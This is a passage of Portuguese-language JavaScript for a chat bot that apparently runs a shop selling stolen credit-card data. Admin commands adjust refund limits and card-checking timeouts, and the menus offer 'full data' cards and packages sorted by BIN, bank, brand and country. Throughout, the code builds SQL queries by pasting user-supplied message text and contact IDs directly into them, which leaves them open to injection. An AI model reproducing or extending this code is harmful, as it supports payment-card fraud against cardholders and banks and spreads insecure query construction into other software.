                Texto = `*LIMITE DE REEMBOLSO/TROCA ALTERADA COM SUCESSO!*

*ANTES:* R$: ${LIMITE_REEMBOLSO_CHK_Ant} MINUTOS

*AGORA:* R$: ${LIMITE_REEMBOLSO_CHK} MINUTOS`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/reembolsotempominimo===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                MINIMO_TEMPO_REEMBOLSO_CHK_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MINIMO_TEMPO_REEMBOLSO_CHK'`).get()["VALOR"]
                MINIMO_TEMPO_REEMBOLSO_CHK = msg[1]

                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MINIMO_TEMPO_REEMBOLSO_CHK}' WHERE PARAMETRO = 'MINIMO_TEMPO_REEMBOLSO_CHK'`).run()

                Texto = `*TEMPO MÍNIMO PARA USAR A FUNÇÃO REEMBOLSAR, ALTERADA COM SUCESSO!*

*ANTES:* R$: ${MINIMO_TEMPO_REEMBOLSO_CHK_Ant} MINUTOS

*AGORA:* R$: ${MINIMO_TEMPO_REEMBOLSO_CHK} MINUTOS`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_Texto.indexOf("/tempomaxchecarcc===") > -1 && Adms.includes(Numero)) {
            try {
                msg = Mensagem_Texto.split("===")
                Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

                if (msg[1] === "" || Array_Total_Igual.length != 3) {
                    Texto = `Comando inválido`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                }

                TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA_Ant = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA'`).get()["VALOR"]
                TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA = msg[1]

                await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA}' WHERE PARAMETRO = 'TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA'`).run()

                Texto = `*TEMPO MÁXIMO EM SEGUNDOS PARA CHECAR UMA CC DA FILA, ALTERADA COM SUCESSO!*

*ANTES:* ${TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA_Ant} Segundos

*AGORA:* ${TEMPO_MAXIMO_SEGUNDOS_CHECAR_FILA} Segundos`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            } catch (error) {
                console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
                Texto = `Comando inválido`
                await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳







        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "menu_ccs") {
            FULLDADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FULLDADOS'`).get()["VALOR"]
            if (FULLDADOS === "1") {
                TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
                if ((TIPOMENU_ATUAL).toString() === "a") {
                    //console.log("avançado")

                    CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES"
                    CONSTRUCAO_LISTMESSAGE_title = "QUAL TIPO DE CC?"
                    CONSTRUCAO_LISTMESSAGE_description = `*QUAL TIPO DE CC ESTÁ PROCURANDO?*

Caso queira encontrar a CC desejada com mais rapidez, basta utilizar este comando:

/bin 544731`

                    CONSTRUCAO_LISTMESSAGE_rows = []
                    iD_Footer = Date.now()

                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|catalogo_ccs|fulldados`,
                            title: "💳 CCs FULL DADOS",
                            description: `CCs com dados reais do bico.`,
                        },
                        {
                            rowId: `${iD_Footer.toString()}|catalogo_ccs|infocc`,
                            title: "💳 INFO CCs",
                            description: `CCs com dados complementares.`,
                        },
                    )

                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

                } else {
                    Texto = `*QUAL TIPO DE CC?*

*Digite* /full - 💳 *CCs FULL DADOS*
CCs com dados reais do bico. #CFull#

*Digite* /info - 💳 *INFO CCs*
CCs com dados complementares. #CC#`
                    await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
                    Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
                }
                return
            }
        }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        if (Mensagem_ID_Lista_Array_Partes[1] === "catalogo_ccs") {
            TEXTO_MENU_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_CC'`).get()["VALOR"]

            FULLDADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FULLDADOS'`).get()["VALOR"]
            INFOCC_NORMAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFOCC_NORMAL'`).get()["VALOR"]

            VENDER_UNIDADE_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_UNIDADE_CC'`).get()["VALOR"]
            MODO_VENDA_UNIDADE = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MODO_VENDA_UNIDADE'`).get()["VALOR"]

            VENDER_PACOTE_MIX = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_MIX'`).get()["VALOR"]
            VENDER_PACOTE_MIX_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_MIX_FULL'`).get()["VALOR"]
            VENDER_PACOTE_NIVEL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_NIVEL'`).get()["VALOR"]
            VENDER_PACOTE_NIVEL_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_NIVEL_FULL'`).get()["VALOR"]
            VENDER_PACOTE_BANCO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BANCO'`).get()["VALOR"]
            VENDER_PACOTE_BANCO_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BANCO_FULL'`).get()["VALOR"]
            VENDER_PACOTE_PAIS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_PAIS'`).get()["VALOR"]
            VENDER_PACOTE_PAIS_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_PAIS_FULL'`).get()["VALOR"]
            VENDER_PACOTE_BANDEIRA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BANDEIRA'`).get()["VALOR"]
            VENDER_PACOTE_BANDEIRA_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BANDEIRA_FULL'`).get()["VALOR"]
            VENDER_PACOTE_BIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BIN'`).get()["VALOR"]
            VENDER_PACOTE_BIN_FULL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'VENDER_PACOTE_BIN_FULL'`).get()["VALOR"]

            SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
            SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

            TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
            if ((TIPOMENU_ATUAL).toString() === "a") {

                CONSTRUCAO_LISTMESSAGE_buttonText = "OPÇÕES DE CCS"
                CONSTRUCAO_LISTMESSAGE_title = "QUAL TIPO DE CC?"
                CONSTRUCAO_LISTMESSAGE_description = `Clique em *OPÇÕES* para escolher a CC desejada.

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${Numero}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_CC}`

                CONSTRUCAO_LISTMESSAGE_rows = []
                iD_Footer = Date.now()

                if (Mensagem_ID_Lista_Array_Partes[2] === "fulldados") {
                    if (VENDER_UNIDADE_CC === "1") {
                        if (MODO_VENDA_UNIDADE === "1") {
                            CONSTRUCAO_LISTMESSAGE_rows.push(
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|nivel`,
                                    title: "💳 UNIDADE FULL DADOS",
                                    description: "CCs por unidade, encontre a CCs Full Dados pelos niveis delas.",
                                },
                            )
                        } else {
                            CONSTRUCAO_LISTMESSAGE_rows.push(
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|nivel`,
                                    title: "💳 UNITÁRIA POR NIVEL",
                                    description: "Full Dados",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|banco`,
                                    title: "🏦 UNITÁRIA POR BANCO",
                                    description: "Full Dados",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|bandeira`,
                                    title: "🚩 UNITÁRIA POR BANDEIRA",
                                    description: "Full Dados",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|pais`,
                                    title: "🏴‍☠️ UNITÁRIA POR PAÍS",
                                    description: "Full Dados",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|fulldados|bin`,
                                    title: "🔍 UNITÁRIA POR BIN",
                                    description: "Full Dados",
                                },
                            )
                        }
                    }
                    if (VENDER_PACOTE_MIX_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_MIX_FULL`,
                                title: "📦 PCTs FULL DADOS MIX",
                                description: "Compre pacotes de CCs Full Dados 100% aleatórias.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_NIVEL_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_NIVEL_FULL`,
                                title: "📦 PCTs por NIVEIS FULL DADOS",
                                description: "Compre pacotes de CCs de apenas um tipo de nivel.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BANCO_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BANCO_FULL`,
                                title: "📦 PCTs por BANCO FULL DADOS",
                                description: "Compre pacotes de CCs de apenas um tipo de banco.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_PAIS_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_PAIS_FULL`,
                                title: "📦 PCTs por PAIS FULL DADOS",
                                description: "Compre pacotes de CCs de apenas um tipo de país.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BANDEIRA_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BANDEIRA_FULL`,
                                title: "📦 PCTs por BANDEIRA FULL DADOS",
                                description: "Compre pacotes de CCs de apenas um tipo de bandeira.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BIN_FULL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BIN_FULL`,
                                title: "📦 PCTs por BIN FULL DADOS",
                                description: "Compre pacotes de CCs de apenas um tipo de bin.",
                            },
                        )
                    }
                } else {
                    if (VENDER_UNIDADE_CC === "1") {
                        if (MODO_VENDA_UNIDADE === "1") {
                            CONSTRUCAO_LISTMESSAGE_rows.push(
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|nivel`,
                                    title: "💳 UNIDADE INFOCC",
                                    description: "CCs por unidade, encontre a CC desejada pelos niveis delas.",
                                },
                            )
                        } else {
                            CONSTRUCAO_LISTMESSAGE_rows.push(
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|nivel`,
                                    title: "💳 UNITÁRIA POR NIVEL",
                                    description: "Info CCs",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|banco`,
                                    title: "🏦 UNITÁRIA POR BANCO",
                                    description: "Info CCs",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|bandeira`,
                                    title: "🚩 UNITÁRIA POR BANDEIRA",
                                    description: "Info CCs",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|pais`,
                                    title: "🏴‍☠️ UNITÁRIA POR PAÍS",
                                    description: "Info CCs",
                                },
                                {
                                    rowId: `${iD_Footer.toString()}|unidade_ccs|infocc|bin`,
                                    title: "🔍 UNITÁRIA POR BIN",
                                    description: "Digite /bin 123456",
                                },
                            )
                        }
                    }
                    if (VENDER_PACOTE_MIX === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_MIX`,
                                title: "📦 PCTs CCs MIX",
                                description: "Compre pacotes de CCs 100% aleatórias.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_NIVEL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_NIVEL`,
                                title: "📦 PCTs por NIVEIS",
                                description: "Compre pacotes de CCs de apenas um tipo de nivel.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BANCO === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_BANCO`,
                                title: "📦 PCTs por BANCO",
                                description: "Compre pacotes de CCs de apenas um tipo de banco.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_PAIS === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|ccs_pacote|Opcoes_Pacote_CCs_PAIS`,
                                title: "📦 PCTs por PAIS",
                                description: "Compre pacotes de CCs de apenas um tipo de país.",
                            },
                        )
                    }
                    if (VENDER_PACOTE_BANDEIRA === "1") {
